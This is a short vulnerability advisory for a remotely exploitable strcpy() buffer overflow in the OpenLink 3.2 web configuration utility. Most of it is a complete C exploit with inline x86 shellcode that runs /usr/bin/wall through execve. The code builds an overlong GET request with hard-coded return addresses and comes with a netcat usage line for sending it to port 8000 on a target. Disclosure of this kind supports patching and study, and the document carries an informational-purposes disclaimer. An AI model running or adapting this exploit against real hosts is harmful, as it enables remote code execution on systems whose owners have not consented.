source: http://www.securityfocus.com/bid/720/info

Both the Unix and WindowsNT versions of OpenLink 3.2 are vulnerable to a remotely exploitable buffer overflow attack. The problem is in their web configuration utility, and is the result of an unchecked strcpy() call. The consequence is the execution of arbitrary code on the target host (running the configuration utility) with the priviliges of the web software. 

#include <stdio.h>
#include <unistd.h>

/*
 * Exploit for Openlink's web configurator for Linux/glibc2
 *  use: pipe through netcat to openlink web port (8000 default)
 *  ex: ./oplwall 0xbffffb85 | nc machine.to.hit 8000
 *  makes www_sv execute /usr/bin/wall if you hit the address right
 *
 * For informational purposes only.  This was written to show that
 *  there's a problem, not for skr1pt k1dd33z --.
 *  don't ask me for help on how to use this to crack systems,
 *  help compiling or anything else.  It will only compile on
 *  an x86 compiler however.
 *
 * Addresses that work for me: 0xbffffb65 (initial run of the broker)
 *                             0xbffffb85 (all consecutive attempts)
 *                             probably tied to process ID www_sv runs as;
 *                             first try PIDs were in triple digits, others
 *                             4 digit PIDs.
 *
 * If this works, generally no more www_sv processes will be run as a side effect.
 */

void test() {

__asm__("

        jmp    doit
exploit:

        # code basically from Aleph One's smash stacking article, with
        #  minor mods

        popl  %esi
        movb  $0xd0, %al            # Get a / character into %al
        xorb  $0xff, %al
        movb  %al, 0x1(%esi)        # drop /s into place
        movb  %al, 0x5(%esi)
        movb  %al, 0x9(%esi)
        xorl  %eax,%eax             # clear %eax
        movb  %eax,0xe(%esi)        # drop a 0 at end of string
        movl  %eax,0x13(%esi)       # drop NULL for environment
        leal  0x13(%esi),%edx       # point %edx to environment
        movl  %esi,0xf(%esi)        # drop pointer to argv
        leal  0xf(%esi),%ecx        # point %ecx to argv
        movl  %esi,%ebx             # point ebx to command - 1
        inc   %ebx                  # fix it to point to the right place
        movb  $0xb,%al              # index to execve syscall
        int   $0x80                 # execute it
        xorl  %ebx,%ebx            #  if exec failed, exit nicely...
        movl  %ebx,%eax
        inc   %eax
        int   $0x80
doit:
        call exploit
        .string \"..usr.bin.wall.\"
");

}

char *shellcode = ((char *)test) + 3;

char code[1000];

int main(int argc, char *argv[])

{
        int i;
        int left;
        unsigned char where[] = {"\0\0\0\0\0"} ;
        int *here;
        char *dummy;
        long addr;


        if (argc > 1)
                addr = strtoul(argv[1], &dummy, 0);
        else
                addr = 0xbffffb85;

        fprintf(stderr, "Setting address to %8x\n", addr);

        *((long *)where) = addr;

        strcpy(code, shellcode);

        for (i = 0; i < 64; i++) {
                strcat(code, where);
        }

        printf("GET %s\n", code);

        exit(0);

}